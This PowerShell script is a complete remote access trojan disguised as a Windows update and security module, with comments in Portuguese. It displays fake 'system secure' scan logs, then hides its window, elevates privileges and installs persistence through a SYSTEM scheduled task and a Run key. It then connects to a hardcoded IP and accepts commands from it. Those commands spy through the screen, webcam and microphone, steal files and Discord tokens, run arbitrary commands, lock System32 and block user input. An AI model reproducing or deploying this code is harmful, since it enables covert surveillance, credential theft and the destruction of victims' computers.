<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module - Complete Control
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== ELEVAR PRIVILEGIOS =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# ===== LOGS FAKES =====
$host.UI.RawUI.ForegroundColor = "Green"
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "    Versao 10.0.19045.1" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Milliseconds 500

$logs = @(
    "Inicializando modulo de verificacao do sistema...",
    "Carregando bibliotecas de analise...",
    "Verificando integridade do sistema...",
    "Escaneando arquivos criticos do Windows...",
    "Analisando processos em execucao...",
    "Detectando possiveis ameacas..."
)

foreach ($log in $logs) {
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $log" -ForegroundColor Gray
    Start-Sleep -Milliseconds 300
}

Write-Host ""
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] VERIFICACAO CONCLUIDA - SISTEMA SEGURO" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNCOES PRINCIPAIS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch {
        return "SCREEN_ERROR"
    }
}

# ===== CONTROLE DE MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        return "RIGHTCLICK_ERROR" 
    }
}

function DoubleClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}{ENTER}")
        return "OK"
    } catch { 
        return "DOUBLECLICK_ERROR" 
    }
}

# ===== CONTROLE DE TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        return "TEXT_ERROR" 
    }
}

# ===== GERENCIADOR DE ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        if (-not (Test-Path $Path)) { return "[]" }
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                FullName = $_.FullName
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
                Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
                Modified = $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { return "[]" }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { return "DOWNLOAD_ERROR" }
}

function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($result)) { $result = "Comando executado (sem saida)" }
        return $result
    } catch {
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN GRABBER =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb"
        )
        
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch { return "TOKENS_ERROR" }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        takeown /f $path /r /d y 2>$null
        icacls $path /grant Administradores:F /t 2>$null
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "SYSTEM32_ERROR"
    }
}

# ===== TELA PRETA (BLOQUEIO TOTAL) =====
$blackScreenForm = $null

function Black-Screen {
    try {
        Add-Type @"
            using System;
            using System.Drawing;
            using System.Windows.Forms;
            public class BlackScreenForm : Form {
                public BlackScreenForm() {
                    this.FormBorderStyle = FormBorderStyle.None;
                    this.WindowState = FormWindowState.Maximized;
                    this.TopMost = true;
                    this.BackColor = Color.Black;
                    this.ControlBox = false;
                    this.ShowInTaskbar = false;
                    this.KeyPreview = true;
                }
                protected override bool ProcessCmdKey(ref Message msg, Keys keyData) {
                    return true;
                }
            }
"@ -ReferencedAssemblies "System.Windows.Forms.dll", "System.Drawing.dll"
        
        $global:blackScreenForm = New-Object BlackScreenForm
        $global:blackScreenForm.ShowDialog()
        return "BLACK_SCREEN"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        if ($global:blackScreenForm -and !$global:blackScreenForm.IsDisposed) {
            $global:blackScreenForm.Invoke([Action]{ $global:blackScreenForm.Close() })
            $global:blackScreenForm.Dispose()
            $global:blackScreenForm = $null
        }
        return "UNLOCK_SCREEN"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== TRAVAR MOUSE + TECLADO =====
$lockActive = $false
$lockHook = $null

function Lock-Input {
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            using System.Windows.Forms;
            
            public class InputLocker {
                [DllImport("user32.dll")]
                public static extern bool SetCursorPos(int x, int y);
                
                [DllImport("user32.dll")]
                public static extern bool ClipCursor(ref RECT lpRect);
                
                [DllImport("user32.dll")]
                public static extern int ShowCursor(bool bShow);
                
                [DllImport("user32.dll")]
                public static extern bool BlockInput(bool fBlockIt);
                
                [DllImport("user32.dll")]
                public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
                
                [DllImport("user32.dll")]
                public static extern bool UnhookWindowsHookEx(IntPtr hhk);
                
                [DllImport("user32.dll")]
                public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
                
                [DllImport("kernel32.dll")]
                public static extern IntPtr GetModuleHandle(string lpModuleName);
                
                public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
                
                public struct RECT { public int left, top, right, bottom; }
                
                private static LowLevelKeyboardProc _proc = HookCallback;
                private static IntPtr _hookID = IntPtr.Zero;
                private static bool _locked = false;
                
                public static void Lock() {
                    _locked = true;
                    
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
                    ClipCursor(ref rect);
                    
                    ShowCursor(false);
                    
                    try { BlockInput(true); } catch { }
                    
                    using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
                    using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
                        _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
                    }
                }
                
                public static void Unlock() {
                    _locked = false;
                    
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0;
                    rect.right = Screen.PrimaryScreen.Bounds.Width;
                    rect.bottom = Screen.PrimaryScreen.Bounds.Height;
                    ClipCursor(ref rect);
                    
                    ShowCursor(true);
                    
                    try { BlockInput(false); } catch { }
                    
                    if (_hookID != IntPtr.Zero) {
                        UnhookWindowsHookEx(_hookID);
                        _hookID = IntPtr.Zero;
                    }
                }
                
                private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                    if (_locked && nCode >= 0) {
                        return (IntPtr)1;
                    }
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
            }
"@ -ReferencedAssemblies "System.Windows.Forms.dll"
        
        [InputLocker]::Lock()
        $global:lockActive = $true
        return "LOCK_ACTIVATED"
    } catch {
        return "LOCK_ERROR"
    }
}

function Unlock-Input {
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            using System.Windows.Forms;
            
            public class InputLocker {
                [DllImport("user32.dll")]
                public static extern bool ClipCursor(ref RECT lpRect);
                
                [DllImport("user32.dll")]
                public static extern int ShowCursor(bool bShow);
                
                [DllImport("user32.dll")]
                public static extern bool BlockInput(bool fBlockIt);
                
                public struct RECT { public int left, top, right, bottom; }
                
                public static void Unlock() {
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0;
                    rect.right = Screen.PrimaryScreen.Bounds.Width;
                    rect.bottom = Screen.PrimaryScreen.Bounds.Height;
                    ClipCursor(ref rect);
                    ShowCursor(true);
                    try { BlockInput(false); } catch { }
                }
            }
"@ -ReferencedAssemblies "System.Windows.Forms.dll"
        
        [InputLocker]::Unlock()
        $global:lockActive = $false
        return "LOCK_DEACTIVATED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        $filename = "$env:TEMP\mic_$(Get-Random).wav"
        
        $recorder = New-Object -ComObject SoundRecorder
        $recorder.StartRecording($filename)
        Start-Sleep -Seconds 5
        $recorder.StopRecording()
        
        if (Test-Path $filename) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
            Remove-Item $filename -Force
            return "AUDIO:$content"
        }
        return "AUDIO_ERROR"
    } catch {
        return "AUDIO_ERROR"
    }
}

# ===== MICROFONE STREAM =====
$micActive = $false
$micThread = $null

function Start-MicStream {
    param($writer)
    
    $global:micActive = $true
    
    while ($global:micActive) {
        try {
            $filename = "$env:TEMP\mic_$(Get-Random).wav"
            
            $recorder = New-Object -ComObject SoundRecorder
            $recorder.StartRecording($filename)
            Start-Sleep -Seconds 2
            $recorder.StopRecording()
            
            if (Test-Path $filename) {
                $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
                Remove-Item $filename -Force
                $writer.WriteLine("MIC_STREAM:$content")
            }
        } catch {
            # Ignora erros
        }
        Start-Sleep -Milliseconds 100
    }
}

function Stop-MicStream {
    $global:micActive = $false
    if ($global:micThread -and $global:micThread.IsAlive) {
        $global:micThread.Abort()
    }
    return "MIC_STOPPED"
}

# ===== WEBCAM =====
function Get-Webcam {
    try {
        Add-Type @"
            using System;
            using System.Drawing;
            using System.Runtime.InteropServices;
            using System.Windows.Forms;
            
            public class WebcamCapture {
                [DllImport("avicap32.dll")]
                public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
                
                [DllImport("user32.dll")]
                public static extern bool SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
                
                [DllImport("user32.dll")]
                public static extern bool DestroyWindow(IntPtr hWnd);
                
                const int WM_CAP_CONNECT = 0x400 + 10;
                const int WM_CAP_DISCONNECT = 0x400 + 11;
                const int WM_CAP_GET_FRAME = 0x400 + 12;
                const int WM_CAP_SAVEDIB = 0x400 + 25;
                
                public static string Capture() {
                    IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
                    if (hWnd != IntPtr.Zero) {
                        SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
                        SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
                        
                        string filename = System.IO.Path.GetTempFileName() + ".bmp";
                        SendMessage(hWnd, WM_CAP_SAVEDIB, 0, (int)Marshal.StringToHGlobalAnsi(filename));
                        
                        SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
                        DestroyWindow(hWnd);
                        
                        if (System.IO.File.Exists(filename)) {
                            byte[] bytes = System.IO.File.ReadAllBytes(filename);
                            System.IO.File.Delete(filename);
                            return Convert.ToBase64String(bytes);
                        }
                    }
                    return null;
                }
            }
"@ -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll"
        
        $frame = [WebcamCapture]::Capture()
        if ($frame) {
            return "WEBCAM:$frame"
        }
        return "WEBCAM_ERROR"
    } catch {
        return "WEBCAM_ERROR"
    }
}

# ===== WEBCAM STREAM =====
$webcamActive = $false
$webcamThread = $null

function Start-WebcamStream {
    param($writer)
    
    Add-Type @"
        using System;
        using System.Drawing;
        using System.Runtime.InteropServices;
        using System.Windows.Forms;
        
        public class WebcamCapture {
            [DllImport("avicap32.dll")]
            public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
            
            [DllImport("user32.dll")]
            public static extern bool SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
            
            [DllImport("user32.dll")]
            public static extern bool DestroyWindow(IntPtr hWnd);
            
            const int WM_CAP_CONNECT = 0x400 + 10;
            const int WM_CAP_DISCONNECT = 0x400 + 11;
            const int WM_CAP_GET_FRAME = 0x400 + 12;
            const int WM_CAP_SAVEDIB = 0x400 + 25;
            
            public static string CaptureFrame() {
                IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
                if (hWnd != IntPtr.Zero) {
                    SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
                    SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
                    
                    string filename = System.IO.Path.GetTempFileName() + ".bmp";
                    SendMessage(hWnd, WM_CAP_SAVEDIB, 0, (int)Marshal.StringToHGlobalAnsi(filename));
                    
                    SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
                    DestroyWindow(hWnd);
                    
                    if (System.IO.File.Exists(filename)) {
                        byte[] bytes = System.IO.File.ReadAllBytes(filename);
                        System.IO.File.Delete(filename);
                        return Convert.ToBase64String(bytes);
                    }
                }
                return null;
            }
        }
"@ -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll"
    
    $global:webcamActive = $true
    
    while ($global:webcamActive) {
        try {
            $frame = [WebcamCapture]::CaptureFrame()
            if ($frame) {
                $writer.WriteLine("WEBCAM_STREAM:$frame")
            }
        } catch {
            # Ignora erros
        }
        Start-Sleep -Milliseconds 100
    }
}

function Stop-WebcamStream {
    $global:webcamActive = $false
    if ($global:webcamThread -and $global:webcamThread.IsAlive) {
        $global:webcamThread.Abort()
    }
    return "WEBCAM_STOPPED"
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 30 Name, CPU, WorkingSet, Id | ConvertTo-Json -Compress
        return $processes
    } catch {
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        return "URL_OPENED"
    } catch {
        return "URL_ERROR"
    }
}

# ===== CONTROLE DE ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch { return "POWER_ERROR" }
}

# ===== PERSISTENCIA =====
function Install-Persistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
    } catch { }
    
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    } catch { }
    
    attrib +h +s +r $scriptPath
}

# ===== VERIFICAR INSTALACAO =====
if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-Persistence
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # ENVIA IDENTIFICACAO
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            switch -Wildcard ($cmd) {
                # ===== TELA =====
                "screenshot" { 
                    $writer.WriteLine((Get-ScreenCapture))
                }
                
                # ===== MOUSE =====
                "move *" { 
                    $pos = $cmd.Replace("move ","").Split(" ")
                    if ($pos.Count -ge 2) {
                        $writer.WriteLine((Move-Mouse $pos[0] $pos[1]))
                    }
                }
                "click" { $writer.WriteLine((Click-Mouse)) }
                "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
                "doubleclick" { $writer.WriteLine((DoubleClick-Mouse)) }
                
                # ===== TECLADO =====
                "key *" { 
                    $key = $cmd.Replace("key ","")
                    $writer.WriteLine((Send-Key $key))
                }
                "type *" { 
                    $text = $cmd.Replace("type ","")
                    $writer.WriteLine((Send-Text $text))
                }
                
                # ===== ARQUIVOS =====
                "ls *" { 
                    $path = $cmd.Replace("ls ","")
                    $writer.WriteLine((Get-FileList $path))
                }
                "download *" { 
                    $file = $cmd.Replace("download ","")
                    $writer.WriteLine((Download-File $file))
                }
                "exec *" { 
                    $exe = $cmd.Replace("exec ","")
                    $writer.WriteLine((Execute-Command $exe))
                }
                
                # ===== DADOS =====
                "discord" {
                    $writer.WriteLine((Get-DiscordToken))
                }
                
                # ===== DESTRUTIVAS =====
                "block_system32" {
                    $writer.WriteLine((Block-System32))
                }
                "black_screen" {
                    $ps = [powershell]::Create()
                    $ps.AddScript({ Black-Screen }).BeginInvoke()
                    $writer.WriteLine("BLACK_SCREEN")
                }
                "unlock_screen" {
                    $writer.WriteLine((Unlock-Screen))
                }
                "lock_input" {
                    $writer.WriteLine((Lock-Input))
                }
                "unlock_input" {
                    $writer.WriteLine((Unlock-Input))
                }
                "shutdown" {
                    $writer.WriteLine((Power-Control "shutdown"))
                }
                "reboot" {
                    $writer.WriteLine((Power-Control "reboot"))
                }
                
                # ===== PERIFERICOS =====
                "mic" {
                    $writer.WriteLine((Get-Microphone))
                }
                "mic_start" {
                    if ($global:micThread -and $global:micThread.IsAlive) { $global:micThread.Abort() }
                    $global:micThread = [System.Threading.Thread]::new({
                        Start-MicStream $writer
                    })
                    $global:micThread.IsBackground = $true
                    $global:micThread.Start()
                    $writer.WriteLine("MIC_STREAM_STARTED")
                }
                "mic_stop" {
                    $writer.WriteLine((Stop-MicStream))
                }
                "webcam" {
                    $writer.WriteLine((Get-Webcam))
                }
                "webcam_start" {
                    if ($global:webcamThread -and $global:webcamThread.IsAlive) { $global:webcamThread.Abort() }
                    $global:webcamThread = [System.Threading.Thread]::new({
                        Start-WebcamStream $writer
                    })
                    $global:webcamThread.IsBackground = $true
                    $global:webcamThread.Start()
                    $writer.WriteLine("WEBCAM_STREAM_STARTED")
                }
                "webcam_stop" {
                    $writer.WriteLine((Stop-WebcamStream))
                }
                
                # ===== SISTEMA =====
                "processes" {
                    $writer.WriteLine((Get-ProcessList))
                }
                "url *" {
                    $url = $cmd.Replace("url ","")
                    $writer.WriteLine((Open-Url $url))
                }
                
                # ===== TESTE =====
                "test" { $writer.WriteLine("PONG") }
                
                # ===== SAIR =====
                "exit" { break }
                
                default { $writer.WriteLine("Comando nao reconhecido: $cmd") }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
